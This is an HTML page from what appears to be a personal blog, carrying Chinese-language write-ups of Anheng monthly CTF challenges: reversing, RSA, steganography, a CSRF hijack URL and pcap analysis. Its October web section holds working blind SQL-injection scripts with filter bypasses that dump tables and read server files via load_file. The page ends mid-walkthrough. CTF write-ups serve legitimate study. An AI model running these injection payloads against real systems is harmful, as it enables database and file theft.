@@ -1,0 +1,574 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/assets/avatar.jpg?v=2.1.1" type="image/png" sizes="16x16"><link rel="icon" href="/assets/avatar.jpg?v=2.1.1" type="image/png" sizes="32x32"><meta name="description" content="历史文章补发 部分安恒月赛题目的复现记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="安恒月赛复现集合">
+<meta property="og:url" content="http://chaosec.top/2020/09/13/month-race/index.html">
+<meta property="og:site_name" content="Aesm1p&#39; Blog">
+<meta property="og:description" content="历史文章补发 部分安恒月赛题目的复现记录">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://chaosec.top/2020/09/13/month-race/10.png">
+<meta property="og:image" content="http://chaosec.top/2020/09/13/month-race/11.png">
+<meta property="og:image" content="http://chaosec.top/2020/09/13/month-race/12.png">
+<meta property="og:image" content="https://i.loli.net/2019/01/17/5c40908a8abf5.png">
+<meta property="og:image" content="https://i.loli.net/2019/01/18/5c41e9b279481.png">
+<meta property="og:image" content="https://i.loli.net/2019/01/16/5c3f3979d4b1c.png">
+<meta property="og:image" content="https://i.loli.net/2019/01/31/5c52a84fc2d4e.png">
+<meta property="og:image" content="https://i.loli.net/2019/01/31/5c52a85a2c2bf.png">
+<meta property="og:image" content="https://i.loli.net/2019/02/28/5c778a7acd48e.png">
+<meta property="og:image" content="https://i.loli.net/2019/02/28/5c7779afb7a07.png">
+<meta property="og:image" content="https://i.loli.net/2019/02/28/5c7779ee0e7c4.png">
+<meta property="article:published_time" content="2020-09-13T12:26:04.000Z">
+<meta property="article:modified_time" content="2020-09-13T12:26:04.053Z">
+<meta property="article:author" content="Aesm1p">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://chaosec.top/2020/09/13/month-race/10.png"><title>安恒月赛复现集合 | Aesm1p' Blog</title><link ref="canonical" href="http://chaosec.top/2020/09/13/month-race/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.1.1"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: undefined,
+  header: {"enable":true,"showOnPost":false,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"carbon","highlight":"light","wordWrap":false},
+  reward: true,
+  fancybox: true,
+  zoomImage: {"gapAside":"50px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner header-inner--height header-inner--bgcolor"><nav class="header-nav header-nav--sticky"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-shapes"></i></span><span class="header-nav-menu-item__text">Article</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/archives/"><span class="header-nav-submenu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-submenu-item__text">Archives</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/categories/"><span class="header-nav-submenu-item__icon"><i class="fab fa-buffer"></i></span><span class="header-nav-submenu-item__text">Categories</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/tags/"><span class="header-nav-submenu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-submenu-item__text">Tags</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-address-card"></i></span><span class="header-nav-menu-item__text">About</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">安恒月赛复现集合</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon" data-popover="Created Time" data-popover-pos="up"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__value">2020-09-13</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon" data-popover="Updated Time" data-popover-pos="up"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__value">2020-09-13</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon" data-popover="Words Count" data-popover-pos="up"><i class="far fa-file-word"></i></span><span class="post-meta-item__value">4,939</span></span><span class="post-meta-item post-meta-item--readtime"><span class="post-meta-item__icon" data-popover="Reading Time" data-popover-pos="up"><i class="far fa-clock"></i></span><span class="post-meta-item__value">40m</span></span></div></header><div class="post-body"><p>历史文章补发</p>
+<p>部分安恒月赛题目的复现记录</p>
+<a id="more"></a>
+
+        <h1 id="5月月赛">
+          <a href="#5月月赛" class="heading-link"><i class="fas fa-link"></i></a>5月月赛</h1>
+      
+        <h2 id="crypto-amp-misc">
+          <a href="#crypto-amp-misc" class="heading-link"><i class="fas fa-link"></i></a>crypto&amp;misc</h2>
+      <p>地址:<span class="exturl"><a class="exturl__link" href="https://pan.baidu.com/s/1RB1w5wHuk8bnNShHGaqqVg" target="_blank" rel="noopener">https://pan.baidu.com/s/1RB1w5wHuk8bnNShHGaqqVg</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>   提取码：259q</p>
+
+        <h3 id="baby-writeup">
+          <a href="#baby-writeup" class="heading-link"><i class="fas fa-link"></i></a>baby_writeup</h3>
+      <p>拿到题目先strings一下，发现有个flag{}字样，然后在IDA打开，ctrl+1查找string字符串，找到之后F5反编译一下，记得要找到函数入口，看到代码</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fgets(s, 17, stdin);</span><br><span class="line">if ( strlen(s) !&#x3D; 16 )</span><br><span class="line">exit(0);</span><br><span class="line">sub_400756(s, &amp;v6);</span><br><span class="line">for ( i &#x3D; 0; i &lt; strlen(v6); ++i )</span><br><span class="line">&#123;</span><br><span class="line">if ( byte_601100[(signed __int64)i] !&#x3D; v6[i] )</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;Flag&#123;%s&#125;\n&quot;, s);</span><br></pre></td></tr></table></div></figure>
+<p>可以看到题目是输入一个长度为16的字符串(因为字符串结尾还有一个结束符要占据一位)，然后经过校验之后输出，说明输入的原来就是flag，找到byte_601100内存中的内容，把16进制提取出来</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6DAB1EEB88B9B6179B7ACB7E</span><br></pre></td></tr></table></div></figure>
+<p>猜测它要不是hex要不是base64，尝试一下发现是base64，转换之，需要先进行ascii2hex的转换，这个不理解为什么，然后运行即可得到flag</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# .&#x2F;5aff787616ad1 </span><br><span class="line">base64i5thebest+</span><br><span class="line">Flag&#123;base64i5thebest+&#125;</span><br></pre></td></tr></table></div></figure>
+
+        <h3 id="RSA">
+          <a href="#RSA" class="heading-link"><i class="fas fa-link"></i></a>RSA</h3>
+      <p>这题真是佩服他们的搜索能力，原来还可以这么玩（2333.），打开代码发现是已知n,e求d获取flag</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line">e = <span class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">flag = <span class="string">"flag&#123;"</span> + hashlib.md5(hex(d)).hexdigest() + <span class="string">"&#125;"</span></span><br></pre></td></tr></table></div></figure>
+<p>观察可知本体的e非常大，所以百度搜索 <code>rsa攻击e很大</code>  在第一条结果里面居然就找到思路！！本题是wiener-attack，还附上了github代码，直接copy下来用就可以了，可以得到d的值，代入上述代码中即可得到flag</p>
+
+        <h3 id="洞拐洞拐洞洞拐">
+          <a href="#洞拐洞拐洞洞拐" class="heading-link"><i class="fas fa-link"></i></a>洞拐洞拐洞洞拐</h3>
+      <p>打开图片放大观察发现每一个小像素都是或黑或白的小方块,所以可以把黑色看成1白色看成0转换一下</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">im = Image.open(<span class="string">'5aff787f5d6f2.png'</span>)</span><br><span class="line">pix = im.load()</span><br><span class="line">width = im.size[<span class="number">0</span>]</span><br><span class="line">height = im.size[<span class="number">1</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(width):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(height):</span><br><span class="line">        r,g,b = pix[x,y]</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">255</span>:</span><br><span class="line">            flag += <span class="string">'0'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag += <span class="string">'1'</span></span><br><span class="line">content = re.findall(<span class="string">r'.&#123;8&#125;'</span>,flag)</span><br><span class="line">nflag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> content:</span><br><span class="line">    nflag += chr(int(item,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">flag = base64.b16decode(nflag)</span><br><span class="line">open(<span class="string">'1.wav'</span>,<span class="string">'wb'</span>).write(flag)</span><br></pre></td></tr></table></div></figure>
+<p>处理wav文件，可以用一个Audacity工具，网上有在线版，分析文件，发现文件波形长度应该是八进制文件，分析一下</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">file = <span class="string">'1.wav'</span></span><br><span class="line">wavefile = wave.open(file,<span class="string">'r'</span>)</span><br><span class="line">numframes = wavefile.getnframes()</span><br><span class="line">strdata = wavefile.readframes(numframes)</span><br><span class="line">wavedata = np.fromstring(strdata,dtype=np.int16)</span><br><span class="line">wavedata = wavedata * <span class="number">1.0</span> / (max(abs(wavedata)))</span><br><span class="line">datas = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(wavedata),<span class="number">10</span>):</span><br><span class="line">    datas.append(wavedata[i])</span><br><span class="line"></span><br><span class="line">strs = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line">    x = <span class="string">"%0.2f"</span> % data</span><br><span class="line">    strs += str(int((float(x) + <span class="number">1.0</span>)/<span class="number">0.25</span>) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">tt = re.findall(<span class="string">r'.&#123;3&#125;'</span>,strs)</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> tt:</span><br><span class="line">    flag += chr(int(t,<span class="number">8</span>))</span><br><span class="line"><span class="comment"># print flag</span></span><br><span class="line"><span class="keyword">print</span> base64.b32decode(flag+<span class="string">"======"</span>)</span><br></pre></td></tr></table></div></figure>
+<p>处理一下就可以得到flag，这题真的是头铁，还是我太菜了。。</p>
+
+        <h1 id="7月月赛">
+          <a href="#7月月赛" class="heading-link"><i class="fas fa-link"></i></a>7月月赛</h1>
+      
+        <h2 id="web">
+          <a href="#web" class="heading-link"><i class="fas fa-link"></i></a>web</h2>
+      
+        <h3 id="web02-就是这么直接">
+          <a href="#web02-就是这么直接" class="heading-link"><i class="fas fa-link"></i></a>web02 就是这么直接</h3>
+      <p>这题目我觉得就是脑洞题，题目给出了提示代码，其中有md5函数，可能是提示我们本题和md5有关，其实本题思路就是先提交一个md5值，题目会返回 <code>emmm我觉得答案是啥呢？</code> 查看元素可以看到后面还加了一串md5值，将这段md5再次提交，重复这个过程，直到得到flag，代码如下：</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url =  <span class="string">'http://101.71.29.5:10002/flag.php'</span></span><br><span class="line">payload = &#123;<span class="string">'answer'</span>:<span class="string">'c36af63f87acebba1c23498809db7537'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    content = requests.post(url,payload).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> content:</span><br><span class="line">        print(content)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    new = re.findall(<span class="string">'&lt;!--[0-9a-z]&#123;10,&#125;--&gt;'</span>,content)</span><br><span class="line">    payload = &#123;<span class="string">'answer'</span>: new[<span class="number">0</span>][<span class="number">4</span>:<span class="number">-3</span>]&#125;</span><br></pre></td></tr></table></div></figure>
+
+        <h3 id="web03-简历来了">
+          <a href="#web03-简历来了" class="heading-link"><i class="fas fa-link"></i></a>web03 简历来了</h3>
+      <p>这个题目考察的是CSRF相关的知识点</p>
+<p>/upload/73e0669ac68ffcb28aed0c48b0924a42.jpg<br><span class="exturl"><a class="exturl__link" href="http://138.68.29.92:8888/ContentHijackingLoader.html?objfile=http://127.0.0.1/upload/73e0669ac68ffcb28aed0c48b0924a42.jpg&amp;objtype=flash&amp;target=http://127.0.0.1/admin&amp;postdata=&amp;logmode=result&amp;regex=&amp;isauto=1">http://138.68.29.92:8888/ContentHijackingLoader.html?objfile=http://127.0.0.1/upload/73e0669ac68ffcb28aed0c48b0924a42.jpg&amp;objtype=flash&amp;target=http://127.0.0.1/admin&amp;postdata=&amp;logmode=result&amp;regex=&amp;isauto=1</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="MISC">
+          <a href="#MISC" class="heading-link"><i class="fas fa-link"></i></a>MISC</h2>
+      <p>链接：<span class="exturl"><a class="exturl__link" href="https://pan.baidu.com/s/1kqOTuqtJsW6PK4ob2_VqNg" target="_blank" rel="noopener">https://pan.baidu.com/s/1kqOTuqtJsW6PK4ob2_VqNg</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>   密码：m97g</p>
+
+        <h3 id="0x01-弱口令">
+          <a href="#0x01-弱口令" class="heading-link"><i class="fas fa-link"></i></a>0x01-弱口令</h3>
+      <p>这题比较坑，题目是个压缩包，解压需要密码，打开压缩包之后发现有一段不可见文本，复制一下在sublime中打开发现是摩斯密码，解密一下 <code>HELL0FORUM</code> ，解压这个压缩包，发现一张图片，一道基本的LSB色道隐写，用脚本跑一下即可</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lsb.py extract aa.png 1.txt 123456</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><figcaption><span>是弱口令</span></figcaption><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 0X02-浏览图片的时候刷新键有没有用呢 </span><br><span class="line"></span><br><span class="line">由刷新可以联想到这题考察的是F5算法，网上查找解密算法</span><br></pre></td></tr></table></div></figure>
+<p>java Extract Misc.jpg<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">可以得到一个文本文件，看文件前缀发现是zip文件前缀，修改文件后缀为zip即可，zip文件还有一层伪加密，之后解密即可得到flag</span><br><span class="line"></span><br><span class="line">### 0x03-到底为了什么</span><br></pre></td></tr></table></div></figure><br>http.request.uri contains “pma”<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[](month_race&#x2F;1.png)</span><br><span class="line"></span><br><span class="line">可以看到有一条修改密码的命令，继续浏览发现应该是一个csrf攻击的流量包，网上查找cve编号</span><br><span class="line"></span><br><span class="line">[](month_race&#x2F;2.png)</span><br><span class="line"></span><br><span class="line">计算flag</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;?php</span><br><span class="line">$con &#x3D; strtolower(&quot;CVE-2017-1000499_CWE-352_2018-06-15 09:40:12&quot;);</span><br><span class="line">echo md5($con);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure></p>
+
+        <h1 id="十月月赛">
+          <a href="#十月月赛" class="heading-link"><i class="fas fa-link"></i></a>十月月赛</h1>
+      
+        <h2 id="web-1">
+          <a href="#web-1" class="heading-link"><i class="fas fa-link"></i></a>web</h2>
+      
+        <h3 id="好黑的黑名单">
+          <a href="#好黑的黑名单" class="heading-link"><i class="fas fa-link"></i></a>好黑的黑名单</h3>
+      <p>随便测试可以发现数据库名长度为3</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;101.71.29.5:10008&#x2F;show.php?id&#x3D;0||if((length(database())-3),1,0)</span><br></pre></td></tr></table></div></figure>
+<p>题目过滤了分号，单引号，但是regexp没有被过滤，可以使用regexp来绕过，可知数据库名为web</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;101.71.29.5:10008&#x2F;show.php?id&#x3D;if((database()regexp(0x776562)),1,2)</span><br></pre></td></tr></table></div></figure>
+<p>然后爆库名，但是=号被过滤了，但是可以用in来绕过，比如这样</p>
+<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br></pre></td></tr></table></div></figure>
+<p>空格也被过滤了，可以用%0a绕过，还有information.schema.tables也被过滤了，可以用information_schema%0a.%0atables来绕过，代码如下</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://101.71.29.5:10008/show.php?id="</span></span><br><span class="line">test = <span class="string">"0123456789qwertyuiopasdfghjklzxcvbnm,\&#123;|\&#125;~"</span></span><br><span class="line">table = <span class="string">"if(((select%0agroup_concat(table_name)%0afrom%0ainformation_schema%0a.%0atables%0awhere%0atable_schema%0ain%0a(database()))regexp(0x&#123;&#125;)),1,2)"</span></span><br><span class="line"><span class="comment"># table_name:admin,flaggg,menu</span></span><br><span class="line">column = <span class="string">"if(((select%0agroup_concat(column_name)%0afrom%0ainformation_schema%0a.%0acolumns%0awhere%0atable_name%0ain%0a(0x666c61676767))regexp(0x&#123;&#125;)),1,2)"</span></span><br><span class="line"><span class="comment"># id,f1agg</span></span><br><span class="line">content = <span class="string">"if(((select%0af1agg%0afrom%0aflaggg)regexp(0x&#123;&#125;)),1,2)"</span></span><br><span class="line">payload = <span class="string">"5e"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">flagdic = <span class="string">"0123456789abcdeflag."</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> flagdic:</span><br><span class="line">        temp = hex(ord(s))[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">        <span class="comment"># print(url+table.format(payload+temp))</span></span><br><span class="line">        res = requests.get(url+content.format(payload+temp)).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"郑州烩面"</span> <span class="keyword">in</span> res:</span><br><span class="line">            <span class="keyword">if</span> temp == <span class="string">"7b"</span>:</span><br><span class="line">                payload += <span class="string">"2e"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload += temp;</span><br><span class="line">            flag += chr(int(temp,<span class="number">16</span>))</span><br><span class="line">            print(payload)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">"油泼面"</span> <span class="keyword">in</span> res:</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"error"</span>)</span><br></pre></td></tr></table></div></figure>
+<p>看了学长的博客说regexp在匹配flag的时候只能到flag{之后就会报错，这是由于正则表达式中{}是有特殊含义的，所以会报错，我们用 <code>.</code> 来代替{}就可以了</p>
+<p><img src="/2020/09/13/month-race/10.png" alt></p>
+
+        <h3 id="ezsql">
+          <a href="#ezsql" class="heading-link"><i class="fas fa-link"></i></a>ezsql</h3>
+      <p>注入题目，注册账号登录进去查看用户信息时id参数存在注入，需要用到load_file函数，wp里面用了if函数，但是这题我使用的异或运算符^</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">dic = <span class="string">"0123456789ABCDEF"</span></span><br><span class="line">url = <span class="string">"http://101.71.29.5:10015/user/user.php?id="</span></span><br><span class="line">file = open(<span class="string">'1.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line">cookie = &#123;<span class="string">"PHPSESSID"</span>: <span class="string">"8lvl1ukppvqs2ovi8n0a2lu4g5"</span>&#125;</span><br><span class="line"><span class="comment"># index.php</span></span><br><span class="line">index = <span class="string">"0^(hex(load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870)) like 0x&#123;&#125;25)"</span> </span><br><span class="line">config = <span class="string">"0^(hex(load_file(0x2f7661722f7777772f68746d6c2f636f6e6669672f636f6e6669672e706870)) like 0x&#123;&#125;25)"</span> </span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">content = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> dic:</span><br><span class="line">        temp = hex(ord(item))[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">        <span class="comment"># print(url+index.format(payload+temp))</span></span><br><span class="line">        res = requests.get(url+config.format(payload+temp),cookies=cookie).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"admin"</span> <span class="keyword">in</span> res:</span><br><span class="line">            payload += temp</span><br><span class="line">            content += item</span><br><span class="line">            file.writelines(payload)</span><br><span class="line">            file.writelines(content)</span><br><span class="line">            print(payload)</span><br><span class="line">            print(content)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></div></figure>
+<p>可以得到index.php的代码为</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'config/sys_config.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'header.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'CONFIG'</span>]))&#123;</span><br><span class="line">    $config = $_COOKIE[<span class="string">'CONFIG'</span>];</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'config/config.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
+<p>再读config.php</p>
